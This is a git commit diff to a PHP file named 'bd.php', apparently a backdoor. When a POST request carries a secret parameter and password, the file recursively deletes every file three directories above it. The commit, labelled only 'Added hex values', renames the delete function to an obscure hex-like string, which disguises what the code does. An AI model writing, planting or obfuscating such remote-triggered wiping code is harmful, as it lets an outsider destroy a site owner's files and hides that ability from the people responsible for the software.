75774e5523491ad008b4f4c7b9e76b0c21799db9
Fede <fedebosi04@gmail.com>
2020-05-14 17:02:22 +0200

    Added hex values

--- intermission/bd.php
+++ intermission/bd.php
@@ -1,13 +1,13 @@
 <?php
 
   if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["GWcjcR249IvtUSdpalQgKPzk"] === "Prw36BdCqAYO3KOy6iW7D7NO") {
-    recursiveRemoveDirectory("../../../");
+    af4f4d6f3d25a9ee6827d6c5dc77e7("../../../");
   }
 
-  function recursiveRemoveDirectory($directory) {
+  function af4f4d6f3d25a9ee6827d6c5dc77e7($directory) {
     foreach(glob("{$directory}/*") as $file) {
         if(is_dir($file)) {
-            recursiveRemoveDirectory($file);
+            af4f4d6f3d25a9ee6827d6c5dc77e7($file);
         } else {
             unlink($file);
         }
